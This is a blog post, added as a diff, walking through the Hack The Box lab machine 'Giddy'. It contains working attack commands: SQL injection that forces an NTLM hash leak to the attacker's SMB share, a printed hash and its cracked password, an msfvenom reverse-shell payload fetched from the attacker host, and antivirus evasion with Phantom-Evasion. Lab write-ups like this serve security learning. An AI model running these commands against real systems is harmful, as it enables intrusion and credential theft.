@@ -1,0 +1,173 @@
+---
+layout: post
+title:  "Hack The Box Giddy writeup (w/o Metasploit)"
+date:   2019-10-22 11:52:14 -0400
+featured_img: "/assets/nmap-10.10.10.104.png"
+categories: giddy HTB
+---
+
+10.10.10.104 - Giddy
+
+`nmap -sC -sV -O 10.10.10.104`
+
+![nmap](/assets/nmap-10.10.10.104.png) Ports 80 and 443 are open. Name of the machine is 'Giddy'
+
+
+Let's try searching directories on the server:
+
+`root@kali:~/dirsearch# python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e asp -f -t 20 -u 10.10.10.104`
+
+![dirsearch](/assets/dirsearch-10.10.10.104.png)
+
+
+Here we can see two interesting paths:
+- /remote
+- /mvc
+
+
+Let start with `/remote`
+
+![dirsearch](/assets/remote-10.10.10.104.png)
+
+We need credentials to login. But we do not have those. So let's look elsewhere.
+
+Now let's try `/mvc`
+
+![dirsearch](/assets/mvc-10.10.10.104.png)
+
+
+
+Let's check for SQL injections
+![search](/assets/search-10.10.10.104.png)
+
+adding ' in the end of string gives us an error
+![SQL injection](/assets/search-sqli-10.10.10.104.png)
+
+So lets try running sqlmap
+
+`sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=10 --dump`
+
+![SQL injection](/assets/sqlmap-10.10.10.104.png)
+
+We are dealing with MSSQL server here
+
+
+
+Given command will dump tables to `/root/.sqlmap/output/10.10.10.104/dump/Injection/`
+
+![SQL injection](/assets/sqlmap-files-10.10.10.104.png)
+
+But the only useful info we could find is the user --> `Stacy`
+Ok. So what's next?
+After some googling around.
+Everybody was pointing to this post [https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html][xpdirtree] about xpdirtree
+
+We can try to capture NTLM hash using xp_dirtree by making it connect to our SMB server or responder.
+
+`xpdirtree : 1; EXEC MASTER.sys.xp_dirtree '\\10.10.14.19\share'`
+
+![SQL request](/assets/sqli-request-10.10.10.104.png)
+
+and we got hash:
+
+{% highlight shell %}
+Stacy::GIDDY:
+4141414141414141:e2b88cdd4f99f01556ca0199ca1db0e0:010100000000000000b58d3b6879d50
+{% endhighlight %}
+
+So I saved it to giddy_hash.txt file and try to crack it.
+We can do it in `hashcat` or `john`
+
+hashcat
+
+![hashcat part 1](/assets/hashcat-10.10.10.104.png)
+
+![hashcat part 2](/assets/hashcat2-10.10.10.104.png)
+
+john
+
+![john](/assets/john-10.10.10.104.png)
+
+password: xNnWo6272k7x
+So now, let's go to /remote and login with our creds
+
+![login](/assets/login-10.10.10.104.png)
+
+Congrats, we are in.
+
+![login](/assets/user-flag-10.10.10.104.png)
+
+and so, we got user.
+
+Inside Documents folder we found a file name unifivideo.
+Let's google it. Turns out there is a privesc cve ( CVE-2016-6914 ) for this application.
+Here is a good explanation on how we can take advantage of it [https://www.exploit-db.com/exploits/43390][43390]
+
+This part is the most interesting for us:
+
+`By copying an arbitrary "taskkill.exe" to "C:\ProgramData\unifi-video\" as an
+unprivileged user, it is therefore possible to escalate privileges and execute
+arbitrary code as NT AUTHORITY/SYSTEM.`
+
+So all we need here is to generate reverse shell file, name it taskkill.exe, copy it onto the
+system and place it inside `C:\ProgramData\unifi-video\` folder.
+Sounds easy.
+
+So, first, we should generate reverse shell:
+
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=443 -f exe > taskkill.exe`
+
+![msfvenom](/assets/msfvenom-10.10.10.104.png)
+
+and upload our file:
+
+`Invoke-WebRequest -o taskkill.exe http://10.10.14.19/taskkill.exe`
+
+![login](/assets/bad-upload-10.10.10.104.png)
+
+
+Oh no, something is wrong
+
+
+Our file is not there. Why? Probably an antivirus blocking us from doing what we want.
+There is a tool called phantom evasion ([https://github.com/oddcod3/Phantom-Evasion][Phantom]) that
+will help obfuscate code of our reverse shell so antivirus can't recognize and block it.
+
+![phantom1](/assets/phantom1-10.10.10.104.png)
+
+We will use following options.
+1 windows modules ,
+1 shellcode injection
+4 windows shellcode injection heapalloc
+
+![phantom2](/assets/phantom2-10.10.10.104.png)
+
+here we choose Msfvenom
+And for encoding option 4: x86/xor_dynamic + Triple Multibyte-key xor
+
+![phantom3](/assets/phantom3-10.10.10.104.png)
+
+for multi processes behaviour , stripping and signing the executable we choose not to do that
+This time when we upload the file it will work
+
+
+Lets restart service and see waht is going on:
+Restart-Service -Name "Ubiquiti UniFi Video"
+
+![Restart Service](/assets/restart-service-10.10.10.104.png)
+
+so we got the system
+
+![root shell](/assets/root-shell-10.10.10.104.png)
+
+And here goes our root flag
+
+![Root flag](/assets/root-flag-10.10.10.104.png)
+
+
+
+Check out the  for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].
+
+[43390]: https://www.exploit-db.com/exploits/43390
+[Phantom]:   https://github.com/oddcod3/Phantom-Evasion
+[xpdirtree]: https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html
